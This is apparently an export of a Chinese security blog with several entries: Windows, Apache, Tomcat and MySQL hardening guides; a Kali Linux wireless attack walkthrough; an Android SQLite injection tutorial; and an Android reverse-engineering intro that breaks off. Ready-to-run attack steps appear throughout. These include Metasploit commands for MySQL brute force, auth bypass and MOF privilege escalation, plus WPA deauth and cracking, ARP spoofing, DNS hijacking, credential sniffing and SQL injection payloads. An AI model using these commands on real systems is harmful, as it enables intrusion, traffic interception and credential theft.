HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\SynAttackProtect推荐值：2 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\TcpMaxHalfOpen推荐值：500 文件权限 非域环境中关闭windows默认共享C$、D$修改注册表HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer 推荐值：0windows server 2012已默认关闭windows共享。 共享文件夹的共享权限只允许已授权用户访问。 系统服务 禁用TCP/IP上的NetBIOS协议，关闭UDP137、UDP138、TCP139等端口。计算机管理&gt;服务和应用程序&gt;服务禁用TCP/IP NetBIOS Helper服务。再网络连接属性&gt;Internet协议版本4(TCP/IPv4)&gt;高级&gt;WINS&gt;禁用TCP/IP上的NetBIOS 禁用不必要的服务 安全选项 6.1 启用安全选项 打开控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项，进行以下设置： 6.2 禁用未登录前关机 服务器该项是默认禁用的，如果启用会导致服务器安全性大大降低。打开控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;关机：允许系统再未登录前关机项禁用。 其它安全设置 安装企业级防病毒软件并保持病毒库更新。 设置屏幕保护密码和开启时间。 限制远程登录空闲断开时间。控制面板&gt;管理工具&gt;本地安全策略&gt;本地策略&gt;安全选项&gt;Microsoft网络服务器：暂停会话前所需的空闲时间数量设置为15分钟 补丁管理，保持操作系统补丁更新和兼容性测试，对生产服务器安装补丁要慎重。 Apache安全加固 账号策略 1.1 以专门的用户账号和用户组运行Apache服务。 为Apache服务创建Apache用户组。groupadd apache 创建Apache用户并加入Apache用户组。useradd apache -g apache-将以下参数加入Apache配置文件httpd.conf中。12User apacheGroup apache 1.2 检查httpd.conf配置文件中是否允许使用非专用帐号（如root）运行apache服务。默认设置一般服务要求，Linux中默认使用apache或nobody用户，Unix系统中默认使用daemon用户。 授权设置 2.1 严格控制Apache主目录的访问权限，设置只允许root权限修改该目录中的内容。Apache的主目录对应于Apache Server配置文件httpd.conf中的Server Root控制项。1Server Root /usr/local/apache 该目录一般设置为/etc/httpd，默认情况下属主为root用户，其他用户不能修改该目录中的文件。 2.2 严格设置配置文件和日志文件的权限，防止未授权访问。 执行命令chmod 600 /etc/httpd/conf/httpd.conf，设置配置文件为属主可读写，其他用户无访问权限。（默认权限644） 执行命令chmod 644 /var/log/httpd/*.log，设置日志文件为属主可读写，其他用户只读权限。（默认权限644） 日志系统 启用Apache日志系统，修改httpd.conf配置文件，设置日志记录文件、记录内容、记录格式等。 错误日志 12LogLevel notice #日志的级别ErrorLog /.../logs/error_log #日志的保存位置 访问日志 123LogFormat %h %l %u %t \"%r\" %&gt;s %b "%&#123;Accept&#125;i\"%&#123;Referer&#125;i\" \"%&#123;User-Agent&#125;i\""combinedCustomLog /.../logs/access_log combined (访问日志) ErrorLog指令设置错误日志文件名和位置，错误日志是最重要的日志文件，Apache httpd程序将在这个文件中存放诊断信息和处理请求中出现的错误，使用命令ErrorLog syslog将错误日志传送到Syslog。CustomLog指令指定保存日志文件的具体位置和日志格式，访问日志会记录服务器处理的所有请求。LogFormat命令用于设置日志格式，建议设置为combined格式。LogLevel命令用于调整记录在错误日志中的信息的详细程度，建议设置为notice。日志级别默认是warn级别，notice更详细但占用空间更大。 禁止访问外部文件 禁止Apache访问Web目录外的文件。4.1 修改配置文件httpd.conf。12Order Deny,AllowDeny from all 4.2 设置可访问的目录12Order Allow,DenyAllow from /web 4.3 默认配置如下，可根据业务需要进行设置。12Options FollowSymLinksAllowOverride None 禁止目录列出 修改配置文件/etc/httpd/httpd.conf，删除Options的Indexes设置，重启Apache服务生效。12345# Options Indexes FollowSymLinks #删掉IndexesOptions FollowSymLinksAllowOverride NoneOrder allow,denyAllow from all 将Options Indexes FollowSymLinks中的Indexes去掉就可以禁止Apache显示该目录结构，Indexes的作用就是当该目录下没有index.html文件时，自动显示目录结构。 错误页面重定向 Apache错误页面重定向功能可以防止敏感信息泄露。修改配置文件httpd.conf，添加错误重定向页面，重启Apache服务生效。123456ErrorDocument 400 /custom400.htmlErrorDocument 401 /custom401.htmlErrorDocument 403 /custom403.htmlErrorDocument 404 /custom404.htmlErrorDocument 405 /custom405.htmlErrorDocument 500 /custom500.html 拒绝服务防护 根据业务需要合理设置session时间，防止拒绝服务攻击。修改配置文件httpd.conf并重启Apache服务。123Timeout 10 #客户端与服务器端建立连接前的时间间隔KeepAlive OnKeepAliveTimeout 15 #限制每个session的保持时间是15秒，根据具体需要进行设置。 隐藏Apache版本号 修改配置文件httpd.conf。1ServerSignature Off ServerTokens Prod 9.关闭TRACE功能 关闭TRACE功能可防止TRACE方法被恶意利用。在配置文件httpd.conf中添加参数TraceEnable Off，该参数适用于Apache2.0以上版本。 禁用CGI 如果服务器上不需要运行CGI程序，建议禁用CGI。如果没有CGI程序，可以修改配置文件httpd.conf，把cgi-bin目录的配置和模块全部注释掉。12345678#LoadModule cgi_module modules/mod_cgi.so#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/”##AllowOverride None# Options None#Order allow,deny#Allow from all# 绑定监听地址 服务器有多个IP地址时，只监听提供服务的IP地址。 查看是否绑定IP地址。 1cat /etc/httpd/conf/httpd.conf | grep Listen 修改配置文件httpd.conf，设置监听地址Listen IP:80 监听功能默认监听所有地址，如果服务器只有一个IP地址可以不用修改该项。 删除缺省安装的无用文件 删除缺省HTML文件： 1# rm -rf /usr/local/apache2/htdocs/* 删除缺省CGI脚本： 1# rm -rf /usr/local/apache2/cgi-bin/* 删除Apache说明文件： 1# rm -rf /usr/local/apache2/manual 删除源代码文件： 1# rm -rf /path/to/httpd-2.2.4* 删除CGI，一般情况下/var/www/html /var/www/cgi-bin默认就是空的。 禁用非法HTTP方法 禁用PUT、DELETE等危险的HTTP方法，只允许get、post方法。修改配置文件httpd.conf。123456&lt;Location /&gt; &lt;LimitExcept GET POST CONNECT OPTIONS&gt; Order Allow,Deny Deny from all &lt;/LimitExcept&gt; &lt;/Location&gt; Tomcat安全加固Tomcat服务默认启用了管理后台功能，使用该后台可直接上传war文件包对站点进行部署和管理，管理后台可能存在弱口令，可通过上传webshell获取web服务器权限。Tomcat管理后台URL地址一般为http://ip:8080/manager/html。 网络访问控制 如果业务不需要使用Tomcat管理后台管理业务代码，建议使用防火墙功能对管理后台URL地址进行拦截，或直接将Tomcat部署目录中webapps文件夹中的manager、host-manager文件夹全部删除，并注释Tomcat目录conf文件夹中的tomcat-users.xml文件中的所有代码。 如果业务系统需要使用Tomcat管理后台进行业务代码管理发布，建议为管理后台设置强密码，并修改默认用户名admin。 开启Tomcat访问日志 修改conf/server.xml文件，将以下代码取消注释：12&lt;Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs" prefix="localhost_access_log." suffix=".txt" pattern="common" resolveHosts="false"/&gt; 启用访问日志功能，重启Tomcat服务后，在tomcat_home/logs文件夹中就可以看到访问日志。 Tomcat默认账号安全 修改Tomcat安装目录conf下的tomcat-user.xml文件，重新设置复杂口令，并重启Tomcat服务生效。 修改默认访问端口 修改conf/server.xml文件，把默认8080端口修改为其他端口。 重定向错误页面 修改访问Tomcat错误页面的返回信息，在webapps\manager目录中创建相应的401.htm、404.htm、500.htm文件，并在conf/web.xml文件最后一行前添加以下代码：123456789101112&lt;error-page&gt; &lt;error-code&gt;401&lt;/error-code&gt; &lt;location&gt;/401.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;500&lt;/error-code&gt; &lt;location&gt;/500.htm&lt;/location&gt; &lt;/error-page&gt; 禁止列出目录 防止直接访问目录时，由于找不到默认页面而列出目录下文件的情况。在web.xml中将&lt;param-name&gt;listings&lt;/param-name&gt;改成&lt;param-name&gt;false&lt;/param-name&gt;。 删除文档和示例程序 删除webapps目录下的docs、examples、manager、ROOT、host-manager文件夹。 MySQL安全加固漏洞发现 判断Mysql数据库版本 使用nmap的指纹识别可以精确判断数据库版本号，metasploit提供的模块特点是能够判断数据库是否允许外链。12msf&gt; use auxiliary/scanner/mysql/mysql_versionmsf&gt; auxiliary(mysql_version)&gt; set RHOSTS [IP] 如果数据库允许外链就能显示版本号，可以爆破密码。123msf&gt; use auxiliary/scanner/mysql/mysql_loginset USERNAME rootset PASS_FILE [密码字典] 枚举数据库信息12msf&gt; use auxiliary/admin/mysql/mysql_enumshow options 枚举的信息包括mysql版本号、操作系统架构、路径和密码hash等。 Mysql认证漏洞利用 该漏洞编码为CVE-2012-2122，Mysql任意用户密码概率登录漏洞，按照公告说法大约256次就能蒙对一次。MariaDB是为Mysql提供偶然替代功能的数据库服务器，Mysql是开源数据库。MariaDB 5.1.62、5.2.12、5.3.6、5.5.23之前版本和Mysql 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者不需要正确密码就能登录到Mysql服务器。用户连接到MariaDB/Mysql后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MariaDB/Mysql误认为密码是正确的，因为协议使用的是随机字符串，该bug发生的机率为1/256.Mysql版本是否受影响取决于程序编译方式，很多版本并不受此漏洞影响。1234msf&gt; use auxiliary/admin/mysql/mysql_autobypass_hashdumpshow optionsset RHOSTS [IP]exploit UDF提权 Metasploit提供的exploit适用于5.5.9以下。利用Mof提权，该模块可以通过用户名和密码直接返回一个meterpreter会话。12345msf&gt; use exploit/windows/mysql/mysql_mofset rhost [IP]set USERNAME rootset PASSWORD ***exploit 安全加固 账号安全 1.1 禁止Mysql以管理员权限运行 修改配置文件/etc/my.cnf，禁止以管理员账号权限运行MYSQL服务。12[musql.server]user=mysql 1.2 避免不同用户间共享账号 创建用户，执行以下命令将创建用户phplamp。 1mysql&gt; mysql&gt; insert into mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_subject) values("localhost","pppadmin",password("passwd"),'','',''); 使用该用户登录MySQL。1234mysql&gt; exit;@&gt;mysql -u phplamp -p@&gt;********(密码)mysql&gt; 登录成功 1.3 删除无关账号 使用DROP USER删除Mysql账号时，必须确保当前账户拥有Mysql数据库全局CREATE或DELETE权限，账号名称的用户和主机部分分别与用户表记录的User和Host列值对应。 密码策略 使用以下命令修改账号密码，确保密码复杂度并定期修改。12mysql&gt; update user set password=password('passwd') where user='root';mysql&gt; flush privileges; 授权设置 在数据库权限配置能力范围内，根据业务要求配置最小权限设置。 3.1 查看数据库授权情况：123456mysql&gt; use mysql;mysql&gt; select * from user;mysql&gt; select * from db;mysql&gt; select * from host;mysql&gt; select * from tables_priv;mysql&gt; select * from columns_priv; 3.2 使用revoke命令回收不必要的授权。 开启日志审计功能 Mysql日志类型有以下几种： 错误日志：-log-err 查询日志：-log（可选） 慢查询日志：-log-slow-queries（可选） 更新日志：-log-update-二进制日志：-log-bin在my.ini配置文件中增加上述需要的日志类型参数，重启Mysql服务即可启用日志功能。12345678#Enter a name for the binary log. Otherwise a default name will be used. #log-bin= #Enter a name for the query log file. Otherwise a default name will be used. #log= #Enter a name for the error log file. Otherwise a default name will be used. log-error= #Enter a name for the update log file. Otherwise a default name will be used. #log-update= -执行命令show variables like &#39;log_%&#39;;可查看所有log。-执行命令show variables like &#39;log_bin&#39;;可查看具体log。 补丁管理 安装系统补丁前应进行兼容性测试，生产系统更新要慎重。 禁止数据库远程访问 如果数据库不需要远程访问，应禁止远程TCP/IP连接，通过在Mysql服务器的启动参数中添加--skip-networking参数使Mysql服务器不监听任何TCP/IP连接，增加安全性。 设置可信IP访问控制 通过数据库服务器的防火墙功能，限制特定IP通过监听器访问数据库。1mysql&gt; GRANT ALL PRIVILEGES ON db.* TO 用户名@'IP子网/掩码'； 设置连接数 在Mysql配置文件my.conf或my.ini的[mysqld]配置段中添加max_connections = 1000，保存配置文件并重启Mysql服务。]]></content>
+    <title>Kali Linux无线渗透初探</title>
+    <url>/2019/04/06/Kali%20Linux%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h2 id="一-背景"><a href="#一-背景" class="headerlink" title="一. 背景"></a>一. 背景</h2><pre><code>最近一段时间5G和Wi-Fi 6的概念被频繁提起，移动通信安全也再次成为一个热门研究主题。前段时间购入一枚无线网卡，用于Kali Linux下无线网络渗透内容的学习和研究。
+</code></pre><h2 id="二-系统环境"><a href="#二-系统环境" class="headerlink" title="二. 系统环境"></a>二. 系统环境</h2><ol>
+<li>Vmware Workstation 15.0 + Kali Linux 2.0。</li>
+<li>Linux免驱动无线网卡。</li>
+<li>华为荣耀1200Mbps无线路由器。</li>
+</ol>
+<h2 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三. 渗透测试"></a>三. 渗透测试</h2><pre><code>本次分享主要讨论无线网络渗透内容，故Kali Linux环境安装不多介绍。
+</code></pre><h3 id="1-启用无线网卡"><a href="#1-启用无线网卡" class="headerlink" title="1. 启用无线网卡"></a>1. 启用无线网卡</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ifconfig wlan0 up.PNG" alt></p>
+<h3 id="2-开启网卡监听模式"><a href="#2-开启网卡监听模式" class="headerlink" title="2. 开启网卡监听模式"></a>2. 开启网卡监听模式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+<p><img src="/images/airmon-ng start wlan0.PNG" alt></p>
+<p>输入ifconfig命令查看网卡名称变为wlan0mon；<br>输入iwconfig命令确认mode为monitor模式。</p>
+<p><img src="/images/iwconfig.PNG" alt></p>
+<h3 id="3-扫描附近wifi热点"><a href="#3-扫描附近wifi热点" class="headerlink" title="3. 扫描附近wifi热点"></a>3. 扫描附近wifi热点</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="/images/airodump-ng wlan0mon.PNG" alt></p>
+<p>BSSID是路由器MAC地址，CH是无线信道。</p>
+<h3 id="4-对目标路由器进行抓包"><a href="#4-对目标路由器进行抓包" class="headerlink" title="4. 对目标路由器进行抓包"></a>4. 对目标路由器进行抓包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w <span class="built_in">cap</span> wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="/images/airodump-ng.PNG" alt></p>
+<p>-c：信道<br>–bssid：路由器MAC地址，ff:ff:ff:ff:ff:ff表示MAC地址已隐藏。<br>-w：指定抓到的包存放文件</p>
+<p>此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。</p>
+<h3 id="5-强制目标设备重连Wi-Fi"><a href="#5-强制目标设备重连Wi-Fi" class="headerlink" title="5. 强制目标设备重连Wi-Fi"></a>5. 强制目标设备重连Wi-Fi</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon</span><br></pre></td></tr></table></figure>
+<p><img src="/images/aireplay-ng.PNG" alt></p>
+<p>-0：发送n条认证消息<br>-a：路由器MAC地址，ff:ff:ff:ff:ff:ff表示MAC地址已隐藏。<br>-c：目标设备MAC地址，00:00:00:00:00:00表示MAC地址已隐藏。</p>
+<p>看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。</p>
+<h3 id="6-密码爆破"><a href="#6-密码爆破" class="headerlink" title="6. 密码爆破"></a>6. 密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ aircrack-ng <span class="built_in">cap</span>-01.cap -w password.txt</span><br></pre></td></tr></table></figure>
+<h2 id="7-内网漫游"><a href="#7-内网漫游" class="headerlink" title="7. 内网漫游"></a>7. 内网漫游</h2><p>接下来要对目标设备进行进一步攻击，如ARP欺骗、DNS劫持，等。</p>
+<h3 id="8-关闭网卡监听模式"><a href="#8-关闭网卡监听模式" class="headerlink" title="8. 关闭网卡监听模式"></a>8. 关闭网卡监听模式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure>
+<p>用爆破得到的密码连入目标无线网络，查看获取的IP地址，可推断出网关地址。</p>
+<p>用nmap扫描内网就可获取已接入的主机信息。</p>
+<h3 id="9-nmap扫描主机"><a href="#9-nmap扫描主机" class="headerlink" title="9. nmap扫描主机"></a>9. nmap扫描主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sP 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+<h3 id="10-流量转发"><a href="#10-流量转发" class="headerlink" title="10. 流量转发"></a>10. 流量转发</h3><p>选择一台目标靶机，并开启流量转发功能，使靶机流量先经过kali再到路由器。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+<p>然后cat /proc/sys/net/ipv4/ip_forward，如果返回1代表流量转发成功。</p>
+<h3 id="11-对靶机进行ARP欺骗"><a href="#11-对靶机进行ARP欺骗" class="headerlink" title="11. 对靶机进行ARP欺骗"></a>11. 对靶机进行ARP欺骗</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1</span><br></pre></td></tr></table></figure>
+<p>-i：网卡名称<br>-t：目标靶机IP地址<br>-r：网关IP地址</p>
+<p>此时已成功完成中间人攻击，获取靶机到路由器的全部流量信息，可使用其他工具分析流量信息。</p>
+<h3 id="12-使用driftnet监听浏览的图片"><a href="#12-使用driftnet监听浏览的图片" class="headerlink" title="12. 使用driftnet监听浏览的图片"></a>12. 使用driftnet监听浏览的图片</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ driftnet -i wlan0</span><br></pre></td></tr></table></figure>
+<h3 id="13-使用wireshark分析包内容，或抓取账号密码"><a href="#13-使用wireshark分析包内容，或抓取账号密码" class="headerlink" title="13. 使用wireshark分析包内容，或抓取账号密码"></a>13. 使用wireshark分析包内容，或抓取账号密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wireshark &amp;</span><br></pre></td></tr></table></figure>
+<h3 id="14-DNS劫持"><a href="#14-DNS劫持" class="headerlink" title="14. DNS劫持"></a>14. DNS劫持</h3><p>首先添加一条解析</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vi /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+<p>例：<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a> A 1.1.1.1</p>
+<p>然后打开ettercap，[sniff]&gt;[Unified sniffing]，选择wlan0网卡，[Plugins]&gt;[Manage the plugins]，双击dns_spoof模块，最后[start]&gt;[start sniffing]。此时靶机打开google会解析到1.1.1.1，成功完成DNS劫持。</p>
+<p>以上攻击时建立在http协议上，对于https协议，可使用sslstrip对https进行降级，但会导致浏览器提示证书报错。</p>
+]]></content>
+      <categories>
+        <category>无线网络渗透</category>
+      </categories>
+      <tags>
+        <tag>无线渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深入理解SQLite</title>
+    <url>/2019/04/17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQLite/</url>
+    <content><![CDATA[<p>SQLite是一款开源数据库，Android选择SQLite的原因是其内存占用较低。</p>
+<h2 id="深入理解SQLite"><a href="#深入理解SQLite" class="headerlink" title="深入理解SQLite"></a>深入理解SQLite</h2><p>SQLite数据库在Android中默认存储在/data/data/[package name]/databases/位置，文件扩展名为<code>.db</code>。</p>
+<h3 id="分析使用SQLite的简单应用"><a href="#分析使用SQLite的简单应用" class="headerlink" title="分析使用SQLite的简单应用"></a>分析使用SQLite的简单应用</h3><ol>
+<li><p>运行应用程序，使其创建SQLite数据库。</p>
+</li>
+<li><p>使用<code>adb shell</code>访问数据库，可以使用SQLite浏览器访问SQLite文件，也可以使用命令<code>sqlite3</code>进行管理。</p>
+</li>
+<li><p>SQLite数据库文件格式一般为<code>.db</code>，<code>.sqlite</code>，<code>.sqlitedb</code>或开发人员指定的其他扩展名。</p>
+</li>
+<li><p>使用命令<code>sqlite3</code>打开数据库，然后就可以使用sql命令对数据库进行操作，使用<code>.help</code>查看命令帮助。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlite3 [dbname]</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/images/sqlite3.PNG" alt></p>
+<p>.databases：列出数据库名称。<br>.tables：列出数据库包含的表名称。<br>.schema：查看表。</p>
+<ol start="5">
+<li><p>使用<code>.output</code>命令将SQL查询输出自动保存至指定文件，方便后续将文件拉取到本地，如果设置<code>.output stdout</code>，查询输出将在终端打印结果并保存至文件。<code>.dump</code>命令将创建一个列表，该列表包含从数据库创建到现在所执行的全部SQL操作。</p>
+</li>
+<li><p>另外，使用<code>adb shell</code>可以直接在本地对数据库进行操作。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell sqlite3 -column -header /data/data/[package_name]/databases/[db_name] <span class="string">'select * from [table_name]'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h3><p>跟WEB应用类似，Android应用程序中最常见的漏洞之一也是注入类漏洞。一般应用程序查询数据构造的SQL查询语句如下所示：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String getSQL = <span class="string">"SELECT * FROM "</span> + tableName + <span class="string">"WHERE "</span> + username + <span class="string">" = '"</span> + uname + <span class="string">"' AND "</span> + password + <span class="string">" = '"</span> + pword + <span class="string">"'"</span>;</span><br><span class="line"></span><br><span class="line">Cursor cursor = dataBase.rawQuery(getSQL,null)</span><br></pre></td></tr></table></figure></p>
+<p>以上SQL查询用于验证用户登录凭证，然后显示其注册填写的信息，如果验证通过则返回布尔值<code>TRUE</code>。该SQL查询中<code>uname</code>和<code>pword</code>字段从用户输入直接传递到SQL语句，然后使用<code>rawQuery</code>方法执行，<code>rawQuery</code>方法会执行传递过来的任何SQL查询，类似的方法还有<code>execSQL</code>。</p>
+<p>由于SQL查询未对用户端输入进行任何校验，如果用户端提交了不正常的输入，如密码框输入<code>pword&#39; or &#39;1&#39;=&#39;1</code>，从而使SQL查询结果始终为真，该用户将无需正确密码完成登录。同样的，SQLite可以使用<code>--</code>对后面部分进行注释。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT * FROM USER_RECORDS WHERE USERNAME = <span class="string">'uname'</span> AND PASSWORD = <span class="string">'pword'</span> or <span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+<h3 id="Drozer利用SQLite注入漏洞"><a href="#Drozer利用SQLite注入漏洞" class="headerlink" title="Drozer利用SQLite注入漏洞"></a>Drozer利用SQLite注入漏洞</h3><ol>
+<li>启动Drozer连接SQLite数据库。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line"></span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在Drozer控制台使用<code>finduri</code>扫描器模块查看所有内容URI和可访问的URI。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a [package_name]</span><br></pre></td></tr></table></figure>
+<p><img src="/images/drozer.PNG" alt></p>
+<p>3.使用Drozer中的注入扫描程序模块检查应用程序中的注入漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run scanner.provider.injection -a [package_name]</span><br></pre></td></tr></table></figure>
+<p><img src="/images/injection.PNG" alt></p>
+<ol start="4">
+<li>使用参数查询这些内容供应器，如<code>1 = 1</code>将永远为<code>TRUE</code>。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.query [injection_uri] --selection <span class="string">"1=1"</span></span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>还可以使用Drozer的<code>app.provider.insert</code>模块将数据插入数据库表。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.provider.insert [injection_uri] --<span class="built_in">integer</span> _id 1 --string column <span class="string">"string"</span></span><br></pre></td></tr></table></figure>
+<p>执行完成将输出<code>Done.</code>。</p>
+]]></content>
+      <categories>
+        <category>Android安全</category>
+      </categories>
+      <tags>
+        <tag>Android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试小技巧积累</title>
+    <url>/2019/05/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
+    <content><![CDATA[<ol>
+<li>利用Linux命令wget递归下载整站</li>
+</ol>
+<p>wget -r -p -np -k <a href="http://xxx.xx" target="_blank" rel="noopener">http://xxx.xx</a></p>
+<p>-r：递归<br>-k：转换链接（将下载的HTML页面中的链接转换为相对链接，即本地链接）<br>-p：下载页面显示必需元素<br>-np：不追溯至父级<br>-nc：断点续传<br>-o：日志</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Android逆向及安全漏洞审计</title>
+    <url>/2019/04/09/Android%E9%80%86%E5%90%91%E5%8F%8A%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<h2 id="Android应用程序文件结构"><a href="#Android应用程序文件结构" class="headerlink" title="Android应用程序文件结构"></a>Android应用程序文件结构</h2><h3 id="apk程序文件结构"><a href="#apk程序文件结构" class="headerlink" title="apk程序文件结构"></a>apk程序文件结构</h3><p>一般.apk程序包括以下文件和文件夹：</p>
+<ul>
+<li>Classes.dex （文件）</li>
+<li>AndroidManifest.xml （文件）</li>
+<li>META-INF （文件夹）</li>
+<li>resources.arsc （文件）</li>
+<li>res （文件夹）</li>
+<li>assets （文件夹）</li>
+<li>lib （文件夹）</li>
+</ul>
+<h3 id="Android-应用程序组件"><a href="#Android-应用程序组件" class="headerlink" title="Android 应用程序组件"></a>Android 应用程序组件</h3><p>Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。</p>
+<ul>
+<li>活动（Activity）：用户可以与之交互的可视界面。包括按钮，图像，TextView或任何其他可视组件。</li>
+<li>服务（Service）：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务包括从 HTTP 下载文件到在后台播放音乐等任何内容。</li>
+<li>广播接收器（Broadcast Receiver）： Android 应用程序中的接收器，通过 Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。</li>
+<li>共享首选项（Shared Preference）：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为shared_prefs的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。</li>
+<li>意图（Intent）：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。</li>
+<li>内容供应器（Content Provider）：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。</li>
+</ul>
+<h2 id="Android应用程序逆向"><a href="#Android应用程序逆向" class="headerlink" title="Android应用程序逆向"></a>Android应用程序逆向</h2><h3 id="Dex2jar逆向Android应用程序"><a href="#Dex2jar逆向Android应用程序" class="headerlink" title="Dex2jar逆向Android应用程序"></a>Dex2jar逆向Android应用程序</h3><p>dex2jar将字节码（如Classes.dex）转换为可读文件的工具，将.dex文件转换为.jar文件。.dex文件是由java字节码转换的Dalvik字节码。<br>从cmd转到dex2jar文件夹，运行以下命令使用dex2jar工具。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ d2j-dex2jar.bat <span class="string">"X:\..\abc.apk"</span></span><br><span class="line">  dex2jar X:\..\abc.apk -&gt; abc-dex2jar.jar</span><br></pre></td></tr></table></figure></p>
+<p>dex2jar将.apk的.dex文件转换为.jar文件后，就可以使用Java图形查看器（如JD-GUI）打开.jar文件。<br>微信7.0.3 for Android的java源代码。</p>
+<p><img src="/images/JD-GUI.PNG" alt></p>
+<p>注意：如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，我们使用 dex2jar 或 Apktool 反编译应用程序时，不会看到准确的源代码，而是一堆不同的源文件，并不是原始源代码。</p>
+<h3 id="ApkTool逆向Android应用程序"><a href="#ApkTool逆向Android应用程序" class="headerlink" title="ApkTool逆向Android应用程序"></a>ApkTool逆向Android应用程序</h3><p>另一种Android逆向的方法是将.dex文件转换为smali文件，smali是一种文件格式，其语法跟Jasmine语言类似。<br>ApkTool的优点是操作是双向的，反编译一个程序后可以使用ApkTool重新编译，且编译生成一个新的.apk文件。</p>
+<p>ApkTool反编译apk程序</p>
